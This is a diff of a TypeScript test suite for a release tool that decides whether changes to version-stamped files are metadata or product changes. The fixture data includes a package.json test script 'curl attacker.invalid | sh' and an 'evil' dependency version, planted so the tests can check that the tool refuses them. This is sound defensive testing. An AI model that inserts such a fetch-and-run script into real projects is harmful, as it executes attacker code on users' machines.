@@ -9,7 +9,7 @@ import * as fs from 'node:fs';
 import * as os from 'node:os';
 import * as path from 'node:path';
 import { EXIT } from '../lib/headless-artifacts';
-import { bindReceipt, classifyCarryPath, computeCensus, extractReceipt, parseReviewLoop, placeReceiptFirst, planCarry, receiptSummaryLine, renderReceiptBlock } from '../lib/ship-receipt';
+import { bindReceipt, classifyCarryPath, computeCensus, extractReceipt, parseReviewLoop, placeReceiptFirst, planCarry, receiptSummaryLine, renderReceiptBlock, stampOnlyText } from '../lib/ship-receipt';
 import { cleanup, ghShim, makeFixtureRepo, makePr, recordAndBundle, restamp, runBin, type FixtureRepo } from './helpers/restamp-fixture';
 
 const repos: FixtureRepo[] = [];
@@ -413,6 +413,17 @@ describe('gstack-ship-receipt carry (harness lane E row 3: receipt follows a hea
     expect(classifyCarryPath('VERSION', {}, { before: '1.2.3.0\n', after: '1.2.4.0\n' })).toBe('metadata');
     expect(classifyCarryPath('VERSION', {}, { before: '1.2.3.0\n', after: '1.2.4.0\nextra\n' })).toBe('product');
     expect(classifyCarryPath('package.json')).toBe('metadata');
+    // a policy-named stamp path is metadata only while its change is a stamp, the rule the tree receipt applies to the same paths:
+    // a logic change in a stamped source file is product (pass-4 outside review of #3481)
+    const stamped = { oldVersion: '1.2.3.0', newVersion: '1.2.4.0' };
+    expect(classifyCarryPath('src/version.ts', { metadata: ['src/version.ts'] }, { before: 'export const V = "1.2.3.0";\n', after: 'export const V = "1.2.4.0";\n', ...stamped })).toBe('metadata');
+    expect(classifyCarryPath('src/version.ts', { metadata: ['src/version.ts'] }, { before: 'export const V = "1.2.3.0";\n', after: 'export const V = "1.2.4.0";\nexport const unsafe = true;\n', ...stamped })).toBe('product');
+    expect(classifyCarryPath('src/version.ts', { metadata: ['src/version.ts'] }, { before: 'export const V = "1.2.3.0";\n', after: 'export const V = "1.2.3.0";\nexport const unsafe = true;\n', oldVersion: '1.2.3.0', newVersion: '1.2.3.0' })).toBe('product');
+    expect(classifyCarryPath('plugin/manifest.json', { metadata: ['plugin/**'] }, { before: '{\n  "version": "1.2.3"\n}\n', after: '{\n  "version": "1.2.4"\n}\n', ...stamped })).toBe('metadata');
+    expect(classifyCarryPath('plugin/manifest.json', { metadata: ['plugin/**'] }, { before: '{\n  "version": "1.2.3"\n}\n', after: '{\n  "version": "1.2.4",\n  "permissions": ["all"]\n}\n', ...stamped })).toBe('product');
+    expect(stampOnlyText({ before: 'v1.2.3.0', after: 'v1.2.4.0', ...stamped })).toBe(true);
+    expect(stampOnlyText({ before: null, after: 'v1.2.4.0', ...stamped })).toBe(false);
+    expect(stampOnlyText({ before: 'v1.2.3.0', after: 'v1.2.4.0', oldVersion: null, newVersion: '1.2.4.0' })).toBe(false);
     const base = { from: 'f'.repeat(40), head: 'e'.repeat(40), productPatchId: { from: 'p', head: 'p' }, testPatchId: { from: 't', head: 't' }, changedProduct: [], mergeCommits: 0, rangeDiff: 'rd' };
     const meta = planCarry({ ...base, changed: [{ path: 'VERSION', class: 'metadata' }, { path: 'CHANGELOG.md', class: 'metadata' }] });
     expect(meta.ok && meta.carry.reason).toBe('release metadata');
@@ -443,7 +454,7 @@ describe('gstack-ship-receipt carry (harness lane E row 3: receipt follows a hea
     fs.writeFileSync(path.join(repo.work, 'VERSION'), '1.2.4.0\n');
     fs.writeFileSync(path.join(repo.work, 'package.json'), fs.readFileSync(path.join(repo.work, 'package.json'), 'utf8').replace('"version": "1.2.3"', '"version": "1.2.4"'));
     fs.writeFileSync(path.join(repo.work, 'CHANGELOG.md'), fs.readFileSync(path.join(repo.work, 'CHANGELOG.md'), 'utf8').replace('# Changelog\n', '# Changelog\n\n## [1.2.4.0] - 2026-10-26\n\n- a=2\n'));
-    fs.writeFileSync(path.join(repo.work, 'docs', 'notes.md'), 'Previous release v1.2.4.0.\n');
+    fs.writeFileSync(path.join(repo.work, 'docs', 'notes.md'), fs.readFileSync(path.join(repo.work, 'docs', 'notes.md'), 'utf8').replace('v1.2.3.0', 'v1.2.4.0'));
     fs.writeFileSync(path.join(repo.work, 'generated', 'digest.md'), '# digest v1.2.4.0\nbody\n');
     repo.git('commit', '-qam', 'stamp 1.2.4.0');
     const head = repo.git('rev-parse', 'HEAD');
@@ -465,6 +476,14 @@ describe('gstack-ship-receipt carry (harness lane E row 3: receipt follows a hea
     const lock = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
     expect(lock.status).toBe(EXIT.refused);
     expect(lock.err).toContain(': package-lock.json');
+    repo.git('reset', '-q', '--hard', head);
+    // a stamp_paths file whose change is not a stamp (a sentence added under the same version) is a product change, named by path
+    fs.appendFileSync(path.join(repo.work, 'docs', 'notes.md'), 'Deploy hook now runs as root.\n');
+    repo.git('commit', '-qam', 'notes');
+    const stampPath = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
+    expect(stampPath.status).toBe(EXIT.refused);
+    expect(stampPath.err).toContain('(RECEIPT_CARRY_PRODUCT_CHANGED;');
+    expect(stampPath.err).toContain(': docs/notes.md');
     repo.git('reset', '-q', '--hard', head);
     // a dependency swap plus a new script in package.json is a product change, whatever the version did
     fs.writeFileSync(path.join(repo.work, 'package.json'), fs.readFileSync(path.join(repo.work, 'package.json'), 'utf8').replace('"left-pad": "1.2.3"', '"left-pad": "9.9.9-evil"').replace('"scripts": {', '"scripts": { "test": "curl attacker.invalid | sh",'));
